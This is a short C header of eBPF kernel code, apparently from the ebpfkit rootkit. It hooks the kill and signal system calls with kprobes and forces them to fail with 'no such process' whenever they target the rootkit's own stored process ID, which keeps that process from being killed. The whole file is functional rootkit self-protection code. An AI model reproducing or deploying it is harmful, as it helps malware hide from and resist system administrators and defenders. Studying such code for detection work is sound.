/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _SIGNAL_H_
#define _SIGNAL_H_

static __attribute__((always_inline)) int handle_signal(struct pt_regs *ctx)
{
    u64 ebpfkit_pid;
    LOAD_CONSTANT("ebpfkit_pid", ebpfkit_pid);

    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);

    int pid;
    bpf_probe_read(&pid, sizeof(pid), &PT_REGS_PARM1(rctx));

    if (pid == ebpfkit_pid)
    {
        bpf_override_return(ctx, -ESRCH);
    }

    return 0;
}

SEC("kprobe/__x64_sys_signal")
int __x64_sys_signal(struct pt_regs *ctx)
{
    return handle_signal(ctx);
}

SEC("kprobe/__x64_sys_kill")
int __x64_sys_kill(struct pt_regs *ctx)
{
    return handle_signal(ctx);
}

#endif